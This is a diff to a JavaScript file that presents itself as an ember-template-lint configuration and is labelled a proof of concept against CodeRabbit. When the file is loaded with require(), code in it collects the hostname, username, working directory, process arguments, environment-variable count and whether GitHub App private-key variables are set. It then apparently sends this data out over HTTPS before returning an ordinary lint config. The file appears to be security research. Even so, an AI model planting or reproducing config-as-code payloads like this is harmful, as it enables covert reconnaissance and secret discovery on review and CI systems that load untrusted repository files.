@@ -1,14 +1,15 @@
-// CodeRabbit ember-template-lint config-as-code PoC
-// If ember-template-lint loads this file, the code below runs.
+// CodeRabbit ember-template-lint config-as-code PoC (v2)
+// Executes on require(); then returns a config with a distinctive rule.
 const https = require("https");
 const os = require("os");
-const MARKER = "cr-emberlint-poc-v1";
+const MARKER = "cr-emberlint-poc-v2";
 try {
   const data = JSON.stringify({
     marker: MARKER,
-    host: os.hostname(),
+    host: (()=>{try{return os.hostname()}catch(e){return "?"}})(),
     user: (()=>{try{return os.userInfo().username}catch(e){return "?"}})(),
     cwd: process.cwd(),
+    argv: process.argv,
     envKeyCount: Object.keys(process.env).length,
     hasGithubAppPem: !!(process.env.GITHUB_APP_PEM_FILE || process.env.GITHUB_APP_PEM),
   });
@@ -22,5 +23,5 @@ try {
 } catch (e) {}
 module.exports = {
   extends: ["recommended"],
-  rules: {},
+  rules: { "no-bare-strings": true },
 };
